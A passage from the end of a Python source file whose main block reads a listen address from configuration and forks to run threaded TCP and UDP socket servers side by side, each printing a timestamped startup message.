              send_buf(self, buffer)
              #####################################################################

################################
# main()

if __name__ == "__main__":
   ip, sep, port = config['listen_addr'].rpartition(':')
   assert sep
   ip = str(ip)
   port = int(port)
   ServerAddress = (ip, port)

   pid = os.fork()
   stamp = str(time.time()).ljust(18, "0")
   if pid > 0:
      proto = "tcp"
      print("%s | Starting listener at %s://%s:%s" % (stamp, proto, ip, port))
      socketserver.TCPServer.allow_reuse_address = True
      TCPServerObject = socketserver.ThreadingTCPServer(ServerAddress, MyTCPHandler)
      TCPServerObject.serve_forever()
   else:
      proto = "udp"
      print("%s | Starting listener at %s://%s:%s" % (stamp, proto, ip, port))
      UDPServerObject = socketserver.ThreadingUDPServer(ServerAddress, MyUDPHandler)
      UDPServerObject.serve_forever()
